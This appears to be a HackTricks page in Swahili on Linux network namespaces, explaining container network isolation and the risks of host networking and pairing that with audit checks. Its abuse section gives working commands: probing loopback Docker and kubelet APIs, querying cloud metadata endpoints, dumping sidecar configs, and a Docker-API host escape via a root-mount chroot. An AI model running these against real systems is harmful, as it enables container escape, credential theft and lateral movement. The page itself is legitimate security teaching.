# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Network namespace hutenga rasilimali zinazohusiana na mtandao kama vile interfaces, IP addresses, routing tables, hali ya ARP/neighbor, firewall rules, sockets, UNIX-domain abstract socket namespace, na maudhui ya faili kama `/proc/net`. Hii ndiyo sababu container inaweza kuwa na `eth0` yake inayoonekana kama ya kwake, routes zake za ndani, na loopback device yake bila kumiliki network stack halisi ya host.

Kwa upande wa usalama, hili ni muhimu kwa sababu network isolation inahusu zaidi ya port binding. Network namespace ya faragha hupunguza kile ambacho workload inaweza kuchunguza au kusanidi upya moja kwa moja. Mara tu namespace hiyo inaposhirikiwa na host, container inaweza ghafla kupata mwonekano wa host listeners, host-local services, abstract AF_UNIX endpoints, na network control points ambazo hazikukusudiwa kufichuliwa kwa application.

## Uendeshaji

Network namespace mpya iliyoundwa huanza ikiwa na network environment tupu au karibu tupu hadi interfaces ziunganishwe nayo. Container runtimes kisha huunda au kuunganisha virtual interfaces, kuzipa addresses, na kusanidi routes ili workload ipate connectivity inayotarajiwa. Katika deployments zinazotumia bridge, hii kwa kawaida humaanisha container huona interface inayoungwa mkono na veth na iliyounganishwa kwenye host bridge. Katika Kubernetes, CNI plugins hushughulikia usanidi unaolingana wa Pod networking.

Usanifu huu unaeleza kwa nini `--network=host` au `hostNetwork: true` ni mabadiliko makubwa sana. Badala ya kupokea private network stack iliyoandaliwa, workload hujiunga na ile halisi ya host.

## Lab

Unaweza kuona network namespace iliyo karibu tupu kwa kutumia:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Na unaweza kulinganisha containers za kawaida na containers zinazotumia host network kwa kutumia:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Container iliyo kwenye host network haina tena mwonekano wake uliotengwa wa sockets na interfaces. Mabadiliko hayo pekee tayari ni makubwa kabla hata hujauliza process ina capabilities gani.

## Matumizi ya Runtime

Docker na Podman kwa kawaida huunda private network namespace kwa kila container isipokuwa zisanidiwe vinginevyo. Kubernetes kwa kawaida huipa kila Pod network namespace yake, inayoshirikiwa na containers zilizo ndani ya Pod hiyo lakini ikiwa imetenganishwa na host. Hii inamaanisha kuwa `127.0.0.1` kwa kawaida ni ya Pod-local badala ya container-local: listener iliyofungwa kwenye localhost pekee katika container moja kwa kawaida inaweza kufikiwa kutoka kwa sidecars na siblings zake. Mifumo ya Incus/LXC pia hutoa isolation pana inayotegemea network namespace, mara nyingi ikiwa na aina mbalimbali zaidi za virtual networking setups.

Kanuni ya jumla ni kwamba private networking ndiyo boundary ya default ya isolation, huku host networking ikiwa ni opt-out ya wazi kutoka kwenye boundary hiyo.

## Mipangilio Isiyo Sahihi

Mgeuzo muhimu zaidi wa usanidi usio sahihi ni kushiriki host network namespace. Hili wakati mwingine hufanywa kwa ajili ya performance, low-level monitoring, au convenience, lakini huondoa mojawapo ya boundaries zilizo wazi zaidi zinazopatikana kwa containers. Listeners za host-local huwa zinaweza kufikiwa kwa njia ya moja kwa moja zaidi, services za localhost-only zinaweza kufikiwa, na capabilities kama `CAP_NET_ADMIN` au `CAP_NET_RAW` huwa hatari zaidi kwa sababu operations zinazoziwezesha sasa hutekelezwa kwenye mazingira halisi ya host ya network.

Tatizo lingine ni kutoa network-related capabilities kwa kiwango kikubwa kupita kiasi hata network namespace ikiwa private. Private namespace husaidia, lakini haifanyi raw sockets au advanced network control kuwa salama bila madhara.

Katika Kubernetes, `hostNetwork: true` pia hubadilisha kiwango cha imani unachoweza kuweka kwenye Pod-level network segmentation. Kubernetes inaeleza kuwa network plugins nyingi haziwezi kutofautisha ipasavyo traffic ya `hostNetwork` Pod kwa ajili ya matching ya `podSelector` / `namespaceSelector`, na kwa hiyo huichukulia kama traffic ya kawaida ya node. Kwa mtazamo wa attacker, hii inamaanisha kuwa workload iliyoathiriwa ya `hostNetwork` mara nyingi inapaswa kuchukuliwa kama foothold ya network ya kiwango cha node badala ya Pod ya kawaida ambayo bado imewekewa vizuizi na assumptions zilezile za policy kama workloads za overlay-network.

## Matumizi Mabaya

Katika setups zenye isolation dhaifu, attackers wanaweza kukagua services za host zinazosikiliza, kufikia management endpoints zilizofungwa kwenye loopback pekee, kusniff au kuingilia traffic kulingana na capabilities na mazingira halisi, au kubadilisha routing na firewall state ikiwa `CAP_NET_ADMIN` ipo. Kwenye cluster, hili pia linaweza kurahisisha lateral movement na reconnaissance ya control-plane.

Ikiwa unashuku host networking, anza kwa kuthibitisha kuwa interfaces na listeners zinazoonekana ni za host badala ya kuwa za isolated container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Huduma za loopback-only mara nyingi huwa ugunduzi wa kwanza wa kuvutia:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Soketi za UNIX za abstract ni shabaha nyingine ambayo ni rahisi kupuuzwa kwa sababu ziko ndani ya mipaka ya network namespace, ingawa hazifanani na wasikilizaji wa TCP/UDP na huenda zisiwepo kama njia za mfumo wa faili chini ya `/run`. Kwa hiyo, container inayotumia host network inaweza kurithi ufikiaji wa control channels za host pekee ambazo hazikuwahi kuunganishwa kwa bind katika container hata kidogo:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Mfano wa kihistoria ulikuwa bug ya `containerd-shim` abstract-socket exposure, lakini somo pana ni muhimu zaidi kuliko CVE hiyo mahususi: mara workload inapojiunga na host network namespace, huduma za abstract AF_UNIX huwa sehemu ya attack surface pia. Ikiwa sockets hizo zinaonekana kuwa za runtime au za kiutawala, pivot kwenda kwenye [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Ikiwa network capabilities zipo, jaribu kubaini kama workload inaweza kukagua au kubadilisha network stack inayoonekana:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Kwenye kernels za kisasa, host networking pamoja na `CAP_NET_ADMIN` zinaweza pia kufichua njia ya pakiti zaidi ya mabadiliko rahisi ya `iptables` / `nftables`. `tc` qdiscs na filters pia zina scope ya namespace, kwa hivyo katika host network namespace iliyoshirikiwa hutumika kwenye interfaces za host ambazo container inaweza kuona. Ikiwa `CAP_BPF` pia ipo, eBPF programs zinazohusiana na mtandao kama TC na XDP loaders huwa muhimu pia:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Hili ni muhimu kwa sababu attacker anaweza ku-mirror, ku-redirect, ku-shape au ku-drop traffic katika kiwango cha host interface, si kubadilisha tu firewall rules. Katika private network namespace, vitendo hivyo huzuiwa kwenye mwonekano wa container; katika shared host namespace, huanza kuathiri host.

Katika mazingira ya cluster au cloud, host networking pia inahalalisha kufanya local recon ya haraka ya metadata na services zilizo karibu na control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Katika Kubernetes, kumbuka kwamba kuhatarisha **container** yoyote katika Pod yenye **containers** nyingi pia kunatoa ufikiaji wa wasikilizaji wa localhost waliofunguliwa na **containers** wenza na **sidecars**, kwa sababu Pod nzima inashiriki **network namespace** moja. Hili huwa muhimu hasa kwa **service-mesh**, **observability**, na **helper containers** ambazo violesura vyake vya usimamizi au utatuzi wa hitilafu vimekusudiwa kimakusudi kuwa vya ndani ya Pod badala ya kuwa vya kiwango cha cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Chukulia "bound to localhost" kama **Pod-private**, si **container-private**. Baada ya container moja ndani ya Pod ku-compromise, dhana hiyo haipo tena.

### Mfano Kamili: Host Networking + Local Runtime / Kubelet Access

Host networking haitoi host root moja kwa moja, lakini mara nyingi hufichua services ambazo zimekusudiwa kufikiwa kutoka kwenye node yenyewe pekee. Ikiwa mojawapo ya services hizo imelindwa kwa udhaifu, host networking huwa njia ya moja kwa moja ya privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet kwenye localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Athari:

- direct host compromise if a local runtime API is exposed without proper protection
- cluster reconnaissance or lateral movement if kubelet or local agents are reachable
- traffic manipulation or denial of service when combined with `CAP_NET_ADMIN`

## Ukaguzi

Lengo la ukaguzi huu ni kubaini ikiwa process ina private network stack, ni routes na listeners zipi zinaonekana, na ikiwa network view tayari inaonekana kama ya host kabla hata hujajaribu capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Kinachovutia hapa:

- Ikiwa `/proc/self/ns/net` na `/proc/1/ns/net` zinaonekana tayari kama za host, container inaweza kuwa inashiriki network namespace ya host au namespace nyingine isiyo ya faragha.
- `lsns -t net` na `ip netns identify` ni muhimu wakati shell iko tayari ndani ya namespace iliyopewa jina au persistent namespace, na unataka kuihusisha na objects za `/run/netns` kutoka upande wa host.
- `ss -lntup` ni muhimu hasa kwa sababu inaonyesha listeners za loopback-only na endpoints za local management. `ss -xap` na `/proc/net/unix` huongeza mtazamo wa abstract sockets ambao utafutaji wa kawaida wa sockets kwenye filesystem hauonyeshi.
- Routes, majina ya interfaces, muktadha wa firewall, hali ya `tc`, na eBPF attachments huwa muhimu zaidi ikiwa `CAP_NET_ADMIN`, `CAP_NET_RAW`, au `CAP_BPF` ipo.
- Katika Kubernetes, service-name resolution inaposhindwa kutoka kwenye Pod yenye `hostNetwork`, huenda ikawa tu kwa sababu Pod haitumii `dnsPolicy: ClusterFirstWithHostNet`, si kwa sababu service haipo.
- Katika Pods zenye containers nyingi, listeners za localhost ni za network namespace nzima ya Pod, kwa hiyo kagua sidecars na containers wenza kabla ya kudhani kuwa port ya loopback-only haiwezi kufikiwa kutoka kwenye container iliyo-compromised.

Unapokagua container, kila mara tathmini network namespace pamoja na capability set. Host networking pamoja na network capabilities zenye nguvu ni posture tofauti kabisa na bridge networking pamoja na default capability set finyu.

## Marejeo

- [Tahadhari kuhusu Kubernetes NetworkPolicy na `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` ya Linux na isolation ya abstract UNIX sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Ushauri wa containerd: abstract Unix domain sockets zilizo exposed kwa host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Mahitaji ya eBPF token na capabilities kwa network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
